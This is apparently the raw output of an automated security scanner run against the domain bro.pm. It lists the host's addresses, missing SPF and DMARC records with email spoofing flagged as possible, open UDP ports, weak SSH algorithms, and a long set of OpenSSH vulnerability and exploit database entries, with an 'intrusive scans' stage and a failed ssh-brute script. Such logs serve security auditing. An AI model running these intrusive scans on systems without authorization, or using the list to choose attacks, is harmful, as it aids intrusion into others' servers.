+198.199.126.160 - bro.pm
+217.70.178.4 - imap.bro.pm
+142.44.163.110 - irc.bro.pm
+217.70.178.4 - pop.bro.pm
+217.70.178.3 - smtp.bro.pm
+217.70.178.6 - webmail.bro.pm
+217.70.184.50 - www.bro.pm
+====================================================================================
+ CHECKING FOR EMAIL SECURITY
+====================================================================================
+[+] bro.pm has no SPF record!
+[*] No DMARC record found. Looking for organizational record
+[+] No organizational DMARC record
+[+] Spoofing possible for bro.pm!
+DNS record for 198.199.126.160: mta-86.mailcasinox.com
+Not shown: 8 closed ports
+PORT    STATE         SERVICE
+53/udp  open|filtered domain
+67/udp  open|filtered dhcps
+123/udp open|filtered ntp
+137/udp open|filtered netbios-ns
+138/udp open|filtered netbios-dgm
+139/udp open|filtered netbios-ssn
+520/udp open|filtered route
+
+Nmap done: 1 IP address (1 host up) scanned in 12.70 seconds
+
+====================================================================================
+ RUNNING INTRUSIVE SCANS
+====================================================================================
+ + -- --=[Port 21 closed... skipping.
+ + -- --=[Port 22 opened... running tests...
+====================================================================================
+ RUNNING SSH AUDIT
+====================================================================================
+# general
+(gen) banner: SSH-2.0-OpenSSH_7.4p1 Debian-10+deb9u7
+(gen) software: OpenSSH 7.4p1
+(gen) compatibility: OpenSSH 7.2+ (some functionality from 6.6), Dropbear SSH 2013.62+
+(gen) compression: enabled (zlib@openssh.com)
+
+# key exchange algorithms
+(kex) curve25519-sha256@libssh.org          -- [info] available since OpenSSH 6.5, Dropbear SSH 2013.62
+(kex) ecdh-sha2-nistp256                    -- [fail] using weak elliptic curves
+                                            `- [info] available since OpenSSH 5.7, Dropbear SSH 2013.62
+(kex) ecdh-sha2-nistp384                    -- [fail] using weak elliptic curves
+                                            `- [info] available since OpenSSH 5.7, Dropbear SSH 2013.62
+(kex) ecdh-sha2-nistp521                    -- [fail] using weak elliptic curves
+                                            `- [info] available since OpenSSH 5.7, Dropbear SSH 2013.62
+(kex) diffie-hellman-group-exchange-sha256  -- [warn] using custom size modulus (possibly weak)
+                                            `- [info] available since OpenSSH 4.4
+(kex) diffie-hellman-group14-sha1           -- [warn] using weak hashing algorithm
+                                            `- [info] available since OpenSSH 3.9, Dropbear SSH 0.53
+(kex) diffie-hellman-group-exchange-sha1    -- [fail] removed (in server) since OpenSSH 6.7, unsafe algorithm
+                                            `- [warn] using weak hashing algorithm
+                                            `- [info] available since OpenSSH 2.3.0
+(kex) diffie-hellman-group1-sha1            -- [fail] removed (in server) since OpenSSH 6.7, unsafe algorithm
+                                            `- [fail] disabled (in client) since OpenSSH 7.0, logjam attack
+                                            `- [warn] using small 1024-bit modulus
+                                            `- [warn] using weak hashing algorithm
+                                            `- [info] available since OpenSSH 2.3.0, Dropbear SSH 0.28
+
+# host-key algorithms
+(key) ssh-rsa                               -- [info] available since OpenSSH 2.5.0, Dropbear SSH 0.28
+(key) rsa-sha2-512                          -- [info] available since OpenSSH 7.2
+(key) rsa-sha2-256                          -- [info] available since OpenSSH 7.2
+(key) ecdsa-sha2-nistp256                   -- [fail] using weak elliptic curves
+                                            `- [warn] using weak random number generator could reveal the key
+                                            `- [info] available since OpenSSH 5.7, Dropbear SSH 2013.62
+
+# encryption algorithms (ciphers)
+(enc) chacha20-poly1305@openssh.com         -- [info] available since OpenSSH 6.5
+                                            `- [info] default cipher since OpenSSH 6.9.
+(enc) aes128-ctr                            -- [info] available since OpenSSH 3.7, Dropbear SSH 0.52
+(enc) aes192-ctr                            -- [info] available since OpenSSH 3.7
+(enc) aes256-ctr                            -- [info] available since OpenSSH 3.7, Dropbear SSH 0.52
+(enc) aes128-gcm@openssh.com                -- [info] available since OpenSSH 6.2
+(enc) aes256-gcm@openssh.com                -- [info] available since OpenSSH 6.2
+
+# message authentication code algorithms
+(mac) umac-64-etm@openssh.com               -- [warn] using small 64-bit tag size
+                                            `- [info] available since OpenSSH 6.2
+(mac) umac-128-etm@openssh.com              -- [info] available since OpenSSH 6.2
+(mac) hmac-sha2-256-etm@openssh.com         -- [info] available since OpenSSH 6.2
+(mac) hmac-sha2-512-etm@openssh.com         -- [info] available since OpenSSH 6.2
+(mac) hmac-sha1-etm@openssh.com             -- [warn] using weak hashing algorithm
+                                            `- [info] available since OpenSSH 6.2
+(mac) umac-64@openssh.com                   -- [warn] using encrypt-and-MAC mode
+                                            `- [warn] using small 64-bit tag size
+                                            `- [info] available since OpenSSH 4.7
+(mac) umac-128@openssh.com                  -- [warn] using encrypt-and-MAC mode
+                                            `- [info] available since OpenSSH 6.2
+(mac) hmac-sha2-256                         -- [warn] using encrypt-and-MAC mode
+                                            `- [info] available since OpenSSH 5.9, Dropbear SSH 2013.56
+(mac) hmac-sha2-512                         -- [warn] using encrypt-and-MAC mode
+                                            `- [info] available since OpenSSH 5.9, Dropbear SSH 2013.56
+(mac) hmac-sha1                             -- [warn] using encrypt-and-MAC mode
+                                            `- [warn] using weak hashing algorithm
+                                            `- [info] available since OpenSSH 2.1.0, Dropbear SSH 0.28
+
+# algorithm recommendations (for OpenSSH 7.4)
+(rec) -diffie-hellman-group14-sha1          -- kex algorithm to remove
+(rec) -ecdh-sha2-nistp256                   -- kex algorithm to remove
+(rec) -diffie-hellman-group-exchange-sha256 -- kex algorithm to remove
+(rec) -diffie-hellman-group1-sha1           -- kex algorithm to remove
+(rec) -diffie-hellman-group-exchange-sha1   -- kex algorithm to remove
+(rec) -ecdh-sha2-nistp521                   -- kex algorithm to remove
+(rec) -ecdh-sha2-nistp384                   -- kex algorithm to remove
+(rec) +diffie-hellman-group18-sha512        -- kex algorithm to append
+(rec) +diffie-hellman-group14-sha256        -- kex algorithm to append
+(rec) +diffie-hellman-group16-sha512        -- kex algorithm to append
+(rec) -ecdsa-sha2-nistp256                  -- key algorithm to remove
+(rec) +ssh-ed25519                          -- key algorithm to append
+(rec) -hmac-sha2-512                        -- mac algorithm to remove
+(rec) -umac-128@openssh.com                 -- mac algorithm to remove
+(rec) -hmac-sha2-256                        -- mac algorithm to remove
+(rec) -umac-64@openssh.com                  -- mac algorithm to remove
+(rec) -hmac-sha1                            -- mac algorithm to remove
+(rec) -hmac-sha1-etm@openssh.com            -- mac algorithm to remove
+(rec) -umac-64-etm@openssh.com              -- mac algorithm to remove
+
+====================================================================================
+ RUNNING NMAP SCRIPTS
+====================================================================================
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-31 13:45 EDT
+Nmap scan report for bro.pm (198.199.126.160)
+Host is up (0.10s latency).
+rDNS record for 198.199.126.160: mta-86.mailcasinox.com
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
+|_ssh-auth-methods: ERROR: Script execution failed (use -d to debug)
+|_ssh-brute: ERROR: Script execution failed (use -d to debug)
+|_ssh-publickey-acceptance: ERROR: Script execution failed (use -d to debug)
+|_ssh-run: ERROR: Script execution failed (use -d to debug)
+| vulscan: VulDB - https://vuldb.com:
+| [130671] gsi-openssh-server 7.9p1 on Fedora /etc/gsissh/sshd_config weak authentication
+| [130371] OpenSSH 7.9 scp Man-in-the-Middle directory traversal
+| [130370] OpenSSH 7.9 Man-in-the-Middle spoofing
+| [130369] OpenSSH 7.9 Encoding progressmeter.c refresh_progress_meter() spoofing
+| [129007] OpenSSH 7.9 scp Client scp.c Filename privilege escalation
+| [123343] OpenSSH up to 7.8 GSS2 auth-gss2.c information disclosure
+| [123011] OpenSSH up to 7.7 auth2-gss.c Request information disclosure
+| [112267] OpenSSH up to 7.3 sshd kex.c/packet.c NEWKEYS Message denial of service
+| [108627] OpenSSH up to 7.5 Readonly Mode sftp-server.c process_open unknown vulnerability
+| [94611] OpenSSH up to 7.3 Access Control privilege escalation
+| [94610] OpenSSH up to 7.3 Shared Memory Manager privilege escalation
+| [94608] OpenSSH up to 7.3 Unix-Domain Socket privilege escalation
+| [94607] OpenSSH up to 7.3 Forwarded Agent Channel privilege escalation
+| [90671] OpenSSH up to 7.2 auth-passwd.c auth_password denial of service
+| [90405] OpenSSH up to 7.2p2 sshd information disclosure
+| [90404] OpenSSH up to 7.2p2 sshd information disclosure
+| [90403] OpenSSH up to 7.2p2 sshd CPU Exhaustion denial of service
+| [89622] OpenSSH 7.2p2 Authentication Username information disclosure
+| [81320] OpenSSH up to 7.2p1 X11 Authentication Credential xauth privilege escalation
+| [80656] OpenBSD OpenSSH 7.1 X11 Forwarding privilege escalation
+| [80330] OpenSSH up to 7.1p1 packet.c ssh_packet_read_poll2 memory corruption
+|
+| MITRE CVE - https://cve.mitre.org:
+| [CVE-2010-4755] The (1) remote_glob function in sftp-glob.c and the (2) process_put function in sftp.c in OpenSSH 5.8 and earlier, as used in FreeBSD 7.3 and 8.1, NetBSD 5.0.2, OpenBSD 4.7, and other products, allow remote authenticated users to cause a denial of service (CPU and memory consumption) via crafted glob expressions that do not match any pathnames, as demonstrated by glob expressions in SSH_FXP_STAT requests to an sftp daemon, a different vulnerability than CVE-2010-2632.
+| [CVE-1999-0661] A system is running a version of software that was replaced with a Trojan Horse at one of its distribution points, such as (1) TCP Wrappers 7.6, (2) util-linux 2.9g, (3) wuarchive ftpd (wuftpd) 2.2 and 2.1f, (4) IRC client (ircII) ircII 2.2.9, (5) OpenSSH 3.4p1, or (6) Sendmail 8.12.6.
+|
+| SecurityFocus - https://www.securityfocus.com/bid/:
+| [102780] OpenSSH CVE-2016-10708 Multiple Denial of Service Vulnerabilities
+| [101552] OpenSSH 'sftp-server.c' Remote Security Bypass Vulnerability
+| [94977] OpenSSH CVE-2016-10011 Local Information Disclosure Vulnerability
+| [94975] OpenSSH CVE-2016-10012 Security Bypass Vulnerability
+| [94972] OpenSSH CVE-2016-10010 Privilege Escalation Vulnerability
+| [94968] OpenSSH CVE-2016-10009 Remote Code Execution Vulnerability
+| [93776] OpenSSH 'ssh/kex.c' Denial of Service Vulnerability
+| [92212] OpenSSH CVE-2016-6515 Denial of Service Vulnerability
+| [92210] OpenSSH CBC Padding Weak Encryption Security Weakness
+| [92209] OpenSSH MAC Verification Security Bypass Vulnerability
+| [91812] OpenSSH CVE-2016-6210 User Enumeration Vulnerability
+| [90440] OpenSSH CVE-2004-1653 Remote Security Vulnerability
+| [90340] OpenSSH CVE-2004-2760 Remote Security Vulnerability
+| [89385] OpenSSH CVE-2005-2666 Local Security Vulnerability
+| [88655] OpenSSH CVE-2001-1382 Remote Security Vulnerability
+| [88513] OpenSSH CVE-2000-0999 Remote Security Vulnerability
+| [88367] OpenSSH CVE-1999-1010 Local Security Vulnerability
+| [87789] OpenSSH CVE-2003-0682 Remote Security Vulnerability
+| [86187] OpenSSH 'session.c' Local Security Bypass Vulnerability
+| [86144] OpenSSH CVE-2007-2768 Remote Security Vulnerability
+| [84427] OpenSSH CVE-2016-1908 Security Bypass Vulnerability
+| [84314] OpenSSH CVE-2016-3115 Remote Command Injection Vulnerability
+| [84185] OpenSSH CVE-2006-4925 Denial-Of-Service Vulnerability
+| [81293] OpenSSH CVE-2016-1907 Denial of Service Vulnerability
+| [80698] OpenSSH CVE-2016-0778 Heap Based Buffer Overflow Vulnerability
+| [80695] OpenSSH CVE-2016-0777 Information Disclosure Vulnerability
+| [76497] OpenSSH CVE-2015-6565 Local Security Bypass Vulnerability
+| [76317] OpenSSH PAM Support Multiple Remote Code Execution Vulnerabilities
+| [75990] OpenSSH Login Handling Security Bypass Weakness
+| [75525] OpenSSH 'x11_open_helper()' Function Security Bypass Vulnerability
+| [71420] Portable OpenSSH 'gss-serv-krb5.c' Security Bypass Vulnerability
+| [68757] OpenSSH Multiple Remote Denial of Service Vulnerabilities
+| [66459] OpenSSH Certificate Validation Security Bypass Vulnerability
+| [66355] OpenSSH 'child_set_env()' Function Security Bypass Vulnerability
+| [65674] OpenSSH 'ssh-keysign.c' Local Information Disclosure Vulnerability
+| [65230] OpenSSH 'schnorr.c' Remote Memory Corruption Vulnerability
+| [63605] OpenSSH 'sshd' Process Remote Memory Corruption Vulnerability
+| [61286] OpenSSH Remote Denial of Service Vulnerability
+| [58894] GSI-OpenSSH PAM_USER Security Bypass Vulnerability
+| [58162] OpenSSH CVE-2010-5107 Denial of Service Vulnerability
+| [54114] OpenSSH 'ssh_gssapi_parse_ename()' Function Denial of Service Vulnerability
+| [51702] Debian openssh-server Forced Command Handling Information Disclosure Vulnerability
+| [50416] Linux Kernel 'kdump' and 'mkdumprd' OpenSSH Integration Remote Information Disclosure Vulnerability
+| [49473] OpenSSH Ciphersuite Specification Information Disclosure Weakness
+| [48507] OpenSSH 'pam_thread()' Remote Buffer Overflow Vulnerability
+| [47691] Portable OpenSSH 'ssh-keysign' Local Unauthorized Access Vulnerability
+| [46155] OpenSSH Legacy Certificate Signing Information Disclosure Vulnerability
+| [45304] OpenSSH J-PAKE Security Bypass Vulnerability
+| [36552] Red Hat Enterprise Linux OpenSSH 'ChrootDirectory' Option Local Privilege Escalation Vulnerability
+| [32319] OpenSSH CBC Mode Information Disclosure Vulnerability
+| [30794] Red Hat OpenSSH Backdoor Vulnerability
+| [30339] OpenSSH 'X11UseLocalhost' X11 Forwarding Session Hijacking Vulnerability
+| [30276] Debian OpenSSH SELinux Privilege Escalation Vulnerability
+| [28531] OpenSSH ForceCommand Command Execution Weakness
+| [28444] OpenSSH X Connections Session Hijacking Vulnerability
+| [26097] OpenSSH LINUX_AUDIT_RECORD_EVENT Remote Log Injection Weakness
+| [25628] OpenSSH X11 Cookie Local Authentication Bypass Vulnerability
+| [23601] OpenSSH S/Key Remote Information Disclosure Vulnerability
+| [20956] OpenSSH Privilege Separation Key Signature Weakness
+| [20418] OpenSSH-Portable Existing Password Remote Information Disclosure Weakness
+| [20245] OpenSSH-Portable GSSAPI Authentication Abort Information Disclosure Weakness
+| [20241] Portable OpenSSH GSSAPI Remote Code Execution Vulnerability
+| [20216] OpenSSH Duplicated Block Remote Denial of Service Vulnerability
+| [16892] OpenSSH Remote PAM Denial Of Service Vulnerability
+| [14963] OpenSSH LoginGraceTime Remote Denial Of Service Vulnerability
+| [14729] OpenSSH GSSAPI Credential Disclosure Vulnerability
+| [14727] OpenSSH DynamicForward Inadvertent GatewayPorts Activation Vulnerability
+| [11781] OpenSSH-portable PAM Authentication Remote Information Disclosure Vulnerability
+| [9986] RCP, OpenSSH SCP Client File Corruption Vulnerability
+| [9040] OpenSSH PAM Conversation Memory Scrubbing Weakness
+| [8677] Multiple Portable OpenSSH PAM Vulnerabilities
+| [8628] OpenSSH Buffer Mismanagement Vulnerabilities
+| [7831] OpenSSH Reverse DNS Lookup Access Control Bypass Vulnerability
+| [7482] OpenSSH Remote Root Authentication Timing Side-Channel Weakness
+| [7467] OpenSSH-portable Enabled PAM Delay Information Disclosure Vulnerability
+| [7343] OpenSSH Authentication Execution Path Timing Information Leakage Weakness
+| [6168] OpenSSH Visible Password Vulnerability
+| [5374] OpenSSH Trojan Horse Vulnerability
+| [5093] OpenSSH Challenge-Response Buffer Overflow Vulnerabilities
+| [4560] OpenSSH Kerberos 4 TGT/AFS Token Buffer Overflow Vulnerability
+| [4241] OpenSSH Channel Code Off-By-One Vulnerability
+| [3614] OpenSSH UseLogin Environment Variable Passing Vulnerability
+| [3560] OpenSSH Kerberos Arbitrary Privilege Elevation Vulnerability
+| [3369] OpenSSH Key Based Source IP Access Control Bypass Vulnerability
+| [3345] OpenSSH SFTP Command Restriction Bypassing Vulnerability
+| [2917] OpenSSH PAM Session Evasion Vulnerability
+| [2825] OpenSSH Client X11 Forwarding Cookie Removal File Symbolic Link Vulnerability
+| [2356] OpenSSH Private Key Authentication Check Vulnerability
+| [1949] OpenSSH Client Unauthorized Remote Forwarding Vulnerability
+| [1334] OpenSSH UseLogin Vulnerability
+|
+| IBM X-Force - https://exchange.xforce.ibmcloud.com:
+| [83258] GSI-OpenSSH auth-pam.c security bypass
+| [82781] OpenSSH time limit denial of service
+| [82231] OpenSSH pam_ssh_agent_auth PAM code execution
+| [74809] OpenSSH ssh_gssapi_parse_ename denial of service
+| [72756] Debian openssh-server commands information disclosure
+| [68339] OpenSSH pam_thread buffer overflow
+| [67264] OpenSSH ssh-keysign unauthorized access
+| [65910] OpenSSH remote_glob function denial of service
+| [65163] OpenSSH certificate information disclosure
+| [64387] OpenSSH J-PAKE security bypass
+| [63337] Cisco Unified Videoconferencing OpenSSH weak security
+| [46620] OpenSSH and multiple SSH Tectia products CBC mode information disclosure
+| [45202] OpenSSH signal handler denial of service
+| [44747] RHEL OpenSSH backdoor
+| [44280] OpenSSH PermitRootLogin information disclosure
+| [44279] OpenSSH sshd weak security
+| [44037] OpenSSH sshd SELinux role unauthorized access
+| [43940] OpenSSH X11 forwarding information disclosure
+| [41549] OpenSSH ForceCommand directive security bypass
+| [41438] OpenSSH sshd session hijacking
+| [40897] OpenSSH known_hosts weak security
+| [40587] OpenSSH username weak security
+| [37371] OpenSSH username data manipulation
+| [37118] RHSA update for OpenSSH privilege separation monitor authentication verification weakness not installed
+| [37112] RHSA update for OpenSSH signal handler race condition not installed
+| [37107] RHSA update for OpenSSH identical block denial of service not installed
+| [36637] OpenSSH X11 cookie privilege escalation
+| [35167] OpenSSH packet.c newkeys[mode] denial of service
+| [34490] OpenSSH OPIE information disclosure
+| [33794] OpenSSH ChallengeResponseAuthentication information disclosure
+| [32975] Apple Mac OS X OpenSSH denial of service
+| [32387] RHSA-2006:0738 updates for openssh not installed
+| [32359] RHSA-2006:0697 updates for openssh not installed
+| [32230] RHSA-2006:0298 updates for openssh not installed
+| [32132] RHSA-2006:0044 updates for openssh not installed
+| [30120] OpenSSH privilege separation monitor authentication verification weakness
+| [29255] OpenSSH GSSAPI user enumeration
+| [29254] OpenSSH signal handler race condition
+| [29158] OpenSSH identical block denial of service
+| [28147] Apple Mac OS X OpenSSH nonexistent user login denial of service
+| [25116] OpenSSH OpenPAM denial of service
+| [24305] OpenSSH SCP shell expansion command execution
+| [22665] RHSA-2005:106 updates for openssh not installed
+| [22117] OpenSSH GSSAPI allows elevated privileges
+| [22115] OpenSSH GatewayPorts security bypass
+| [20930] OpenSSH sshd.c LoginGraceTime denial of service
+| [19441] Sun Solaris OpenSSH LDAP (1) client authentication denial of service
+| [17213] OpenSSH allows port bouncing attacks
+| [16323] OpenSSH scp file overwrite
+| [13797] OpenSSH PAM information leak
+| [13271] OpenSSH could allow an attacker to corrupt the PAM conversion stack
+| [13264] OpenSSH PAM code could allow an attacker to gain access
+| [13215] OpenSSH buffer management errors could allow an attacker to execute code
+| [13214] OpenSSH memory vulnerabilities
+| [13191] OpenSSH large packet buffer overflow
+| [12196] OpenSSH could allow an attacker to bypass login restrictions
+| [11970] OpenSSH could allow an attacker to obtain valid administrative account
+| [11902] OpenSSH PAM support enabled information leak
+| [9803] OpenSSH &quot
+| [9763] OpenSSH downloaded from the OpenBSD FTP site or OpenBSD FTP mirror sites could contain a Trojan Horse
+| [9307] OpenSSH is running on the system
+| [9169] OpenSSH &quot
+| [8896] OpenSSH Kerberos 4 TGT/AFS buffer overflow
+| [8697] FreeBSD libutil in OpenSSH fails to drop privileges prior to using the login class capability database
+| [8383] OpenSSH off-by-one error in channel code
+| [7647] OpenSSH UseLogin option arbitrary code execution
+| [7634] OpenSSH using sftp and restricted keypairs could allow an attacker to bypass restrictions
+| [7598] OpenSSH with Kerberos allows attacker to gain elevated privileges
+| [7179] OpenSSH source IP access control bypass
+| [6757] OpenSSH &quot
+| [6676] OpenSSH X11 forwarding symlink attack could allow deletion of arbitrary files
+| [6084] OpenSSH 2.3.1 allows remote users to bypass authentication
+| [5517] OpenSSH allows unauthorized access to resources
+| [4646] OpenSSH UseLogin option allows remote users to execute commands as root
+|
+| Exploit-DB - https://www.exploit-db.com:
+| [21579] OpenSSH 3.x Challenge-Response Buffer Overflow Vulnerabilities (2)
+| [21578] OpenSSH 3.x Challenge-Response Buffer Overflow Vulnerabilities (1)
+| [21402] OpenSSH 2.x/3.x Kerberos 4 TGT/AFS Token Buffer Overflow Vulnerability
+| [21314] OpenSSH 2.x/3.0.1/3.0.2 Channel Code Off-By-One Vulnerability
+| [20253] OpenSSH 1.2 scp File Create/Overwrite Vulnerability
+| [17462] FreeBSD OpenSSH 3.5p1 - Remote Root Exploit
+| [14866] Novell Netware 6.5 - OpenSSH Remote Stack Overflow
+| [6094] Debian OpenSSH Remote SELinux Privilege Elevation Exploit (auth)
+| [3303] Portable OpenSSH <= 3.6.1p-PAM / 4.1-SUSE Timing Attack Exploit
+| [2444] OpenSSH <= 4.3 p1 (Duplicated Block) Remote Denial of Service Exploit
+| [1572] Dropbear / OpenSSH Server (MAX_UNAUTH_CLIENTS) Denial of Service
+| [258] glibc-2.2 and openssh-2.3.0p1 exploits glibc => 2.1.9x
+| [26] OpenSSH/PAM <= 3.6.1p1 Remote Users Ident (gossh.sh)
+| [25] OpenSSH/PAM <= 3.6.1p1 Remote Users Discovery Tool
+|
+| OpenVAS (Nessus) - http://www.openvas.org:
+| [902488] OpenSSH 'sshd' GSSAPI Credential Disclosure Vulnerability
+| [900179] OpenSSH CBC Mode Information Disclosure Vulnerability
+| [881183] CentOS Update for openssh CESA-2012:0884 centos6
+| [880802] CentOS Update for openssh CESA-2009:1287 centos5 i386
+| [880746] CentOS Update for openssh CESA-2009:1470 centos5 i386
+| [870763] RedHat Update for openssh RHSA-2012:0884-04
+| [870129] RedHat Update for openssh RHSA-2008:0855-01
+| [861813] Fedora Update for openssh FEDORA-2010-5429
+| [861319] Fedora Update for openssh FEDORA-2007-395
+| [861170] Fedora Update for openssh FEDORA-2007-394
+| [861012] Fedora Update for openssh FEDORA-2007-715
+| [840345] Ubuntu Update for openssh vulnerability USN-597-1
+| [840300] Ubuntu Update for openssh update USN-612-5
+| [840271] Ubuntu Update for openssh vulnerability USN-612-2
+| [840268] Ubuntu Update for openssh update USN-612-7
+| [840259] Ubuntu Update for openssh vulnerabilities USN-649-1
+| [840214] Ubuntu Update for openssh vulnerability USN-566-1
+| [831074] Mandriva Update for openssh MDVA-2010:162 (openssh)
+| [830929] Mandriva Update for openssh MDVA-2010:090 (openssh)
+| [830807] Mandriva Update for openssh MDVA-2010:026 (openssh)
+| [830603] Mandriva Update for openssh MDVSA-2008:098 (openssh)
+| [830523] Mandriva Update for openssh MDVSA-2008:078 (openssh)
+| [830317] Mandriva Update for openssh-askpass-qt MDKA-2007:127 (openssh-askpass-qt)
+| [830191] Mandriva Update for openssh MDKSA-2007:236 (openssh)
+| [802407] OpenSSH 'sshd' Challenge Response Authentication Buffer Overflow Vulnerability
+| [103503] openssh-server Forced Command Handling Information Disclosure Vulnerability
+| [103247] OpenSSH Ciphersuite Specification Information Disclosure Weakness
+| [103064] OpenSSH Legacy Certificate Signing Information Disclosure Vulnerability
+| [100584] OpenSSH X Connections Session Hijacking Vulnerability
+| [100153] OpenSSH CBC Mode Information Disclosure Vulnerability
+| [66170] CentOS Security Advisory CESA-2009:1470 (openssh)
+| [65987] SLES10: Security update for OpenSSH
+| [65819] SLES10: Security update for OpenSSH
+| [65514] SLES9: Security update for OpenSSH
+| [65513] SLES9: Security update for OpenSSH
+| [65334] SLES9: Security update for OpenSSH
+| [65248] SLES9: Security update for OpenSSH
+| [65218] SLES9: Security update for OpenSSH
+| [65169] SLES9: Security update for openssh,openssh-askpass
+| [65126] SLES9: Security update for OpenSSH
+| [65019] SLES9: Security update for OpenSSH
+| [65015] SLES9: Security update for OpenSSH
+| [64931] CentOS Security Advisory CESA-2009:1287 (openssh)
+| [61639] Debian Security Advisory DSA 1638-1 (openssh)
+| [61030] Debian Security Advisory DSA 1576-2 (openssh)
+| [61029] Debian Security Advisory DSA 1576-1 (openssh)
+| [60840] FreeBSD Security Advisory (FreeBSD-SA-08:05.openssh.asc)
+| [60803] Gentoo Security Advisory GLSA 200804-03 (openssh)
+| [60667] Slackware Advisory SSA:2008-095-01 openssh
+| [59014] Slackware Advisory SSA:2007-255-01 openssh
+| [58741] Gentoo Security Advisory GLSA 200711-02 (openssh)
+| [57919] Gentoo Security Advisory GLSA 200611-06 (openssh)
+| [57895] Gentoo Security Advisory GLSA 200609-17 (openssh)
+| [57585] Debian Security Advisory DSA 1212-1 (openssh (1:3.8.1p1-8.sarge.6))
+| [57492] Slackware Advisory SSA:2006-272-02 openssh
+| [57483] Debian Security Advisory DSA 1189-1 (openssh-krb5)
+| [57476] FreeBSD Security Advisory (FreeBSD-SA-06:22.openssh.asc)
+| [57470] FreeBSD Ports: openssh
+| [56352] FreeBSD Security Advisory (FreeBSD-SA-06:09.openssh.asc)
+| [56330] Gentoo Security Advisory GLSA 200602-11 (OpenSSH)
+| [56294] Slackware Advisory SSA:2006-045-06 openssh
+| [53964] Slackware Advisory SSA:2003-266-01 New OpenSSH packages
+| [53885] Slackware Advisory SSA:2003-259-01 OpenSSH Security Advisory
+| [53884] Slackware Advisory SSA:2003-260-01 OpenSSH updated again
+| [53788] Debian Security Advisory DSA 025-1 (openssh)
+| [52638] FreeBSD Security Advisory (FreeBSD-SA-03:15.openssh.asc)
+| [52635] FreeBSD Security Advisory (FreeBSD-SA-03:12.openssh.asc)
+| [11343] OpenSSH Client Unauthorized Remote Forwarding
+| [10954] OpenSSH AFS/Kerberos ticket/token passing
+| [10883] OpenSSH Channel Code Off by 1
+| [10823] OpenSSH UseLogin Environment Variables
+|
+| SecurityTracker - https://www.securitytracker.com:
+| [1028187] OpenSSH pam_ssh_agent_auth Module on Red Hat Enterprise Linux Lets Remote Users Execute Arbitrary Code
+| [1026593] OpenSSH Lets Remote Authenticated Users Obtain Potentially Sensitive Information
+| [1025739] OpenSSH on FreeBSD Has Buffer Overflow in pam_thread() That Lets Remote Users Execute Arbitrary Code
+| [1025482] OpenSSH ssh-keysign Utility Lets Local Users Gain Elevated Privileges
+| [1025028] OpenSSH Legacy Certificates May Disclose Stack Contents to Remote Users
+| [1022967] OpenSSH on Red Hat Enterprise Linux Lets Remote Authenticated Users Gain Elevated Privileges
+| [1021235] OpenSSH CBC Mode Error Handling May Let Certain Remote Users Obtain Plain Text in Certain Cases
+| [1020891] OpenSSH on Debian Lets Remote Users Prevent Logins
+| [1020730] OpenSSH for Red Hat Enterprise Linux Packages May Have Been Compromised
+| [1020537] OpenSSH on HP-UX Lets Local Users Hijack X11 Sessions
+| [1019733] OpenSSH Unsafe Default Configuration May Let Local Users Execute Arbitrary Commands
+| [1019707] OpenSSH Lets Local Users Hijack Forwarded X Sessions in Certain Cases
+| [1017756] Apple OpenSSH Key Generation Process Lets Remote Users Deny Service
+| [1017183] OpenSSH Privilege Separation Monitor Validation Error May Cause the Monitor to Fail to Properly Control the Unprivileged Process
+| [1016940] OpenSSH Race Condition in Signal Handler Lets Remote Users Deny Service and May Potentially Permit Code Execution
+| [1016939] OpenSSH GSSAPI Authentication Abort Error Lets Remote Users Determine Valid Usernames
+| [1016931] OpenSSH SSH v1 CRC Attack Detection Implementation Lets Remote Users Deny Service
+| [1016672] OpenSSH on Mac OS X Lets Remote Users Deny Service
+| [1015706] OpenSSH Interaction With OpenPAM Lets Remote Users Deny Service
+| [1015540] OpenSSH scp Double Shell Character Expansion During Local-to-Local Copying May Let Local Users Gain Elevated Privileges in Certain Cases
+| [1014845] OpenSSH May Unexpectedly Activate GatewayPorts and Also May Disclose GSSAPI Credentials in Certain Cases
+| [1011193] OpenSSH scp Directory Traversal Flaw Lets Remote SSH Servers Overwrite Files in Certain Cases
+| [1011143] OpenSSH Default Configuration May Be Unsafe When Used With Anonymous SSH Services
+| [1007791] Portable OpenSSH PAM free() Bug May Let Remote Users Execute Root Code
+| [1007716] OpenSSH buffer_append_space() and Other Buffer Management Errors May Let Remote Users Execute Arbitrary Code
+| [1006926] OpenSSH Host Access Restrictions Can Be Bypassed By Remote Users
+| [1006688] OpenSSH Timing Flaw With Pluggable Authentication Modules Can Disclose Valid User Account Names to Remote Users
+| [1004818] OpenSSH's Secure Shell (SSH) Implementation Weakness May Disclose User Passwords to Remote Users During Man-in-the-Middle Attacks
+| [1004616] OpenSSH Integer Overflow and Buffer Overflow May Allow Remote Users to Gain Root Access to the System
+| [1004391] OpenSSH 'BSD_AUTH' Access Control Bug May Allow Unauthorized Remote Users to Authenticated to the System
+| [1004115] OpenSSH Buffer Overflow in Kerberos Ticket and AFS Token Processing Lets Local Users Execute Arbitrary Code With Root Level Permissions
+| [1003758] OpenSSH Off-by-one 'Channels' Bug May Let Authorized Remote Users Execute Arbitrary Code with Root Privileges
+| [1002895] OpenSSH UseLogin Environment Variable Bug Lets Local Users Execute Commands and Gain Root Access
+| [1002748] OpenSSH 3.0 Denial of Service Condition May Allow Remote Users to Crash the sshd Daemon and KerberosV Configuration Error May Allow Remote Users to Partially Authenticate When Authentication Should Not Be Permitted
+| [1002734] OpenSSH's S/Key Implementation Information Disclosure Flaw Provides Remote Users With Information About Valid User Accounts
+| [1002455] OpenSSH May Fail to Properly Restrict IP Addresses in Certain Configurations
+| [1002432] OpenSSH's Sftp-server Subsystem Lets Authorized Remote Users with Restricted Keypairs Obtain Additional Access on the Server
+| [1001683] OpenSSH Allows Authorized Users to Delete Other User Files Named Cookies
+|
+| OSVDB - http://www.osvdb.org:
+| [92034] GSI-OpenSSH auth-pam.c Memory Management Authentication Bypass
+| [90474] Red Hat / Fedora PAM Module for OpenSSH Incorrect error() Function Calling Local Privilege Escalation
+| [90007] OpenSSH logingracetime / maxstartup Threshold Connection Saturation Remote DoS
+| [81500] OpenSSH gss-serv.c ssh_gssapi_parse_ename Function Field Length Value Parsing Remote DoS
+| [78706] OpenSSH auth-options.c sshd auth_parse_options Function authorized_keys Command Option Debug Message Information Disclosure
+| [75753] OpenSSH PAM Module Aborted Conversation Local Information Disclosure
+| [75249] OpenSSH sftp-glob.c remote_glob Function Glob Expression Parsing Remote DoS
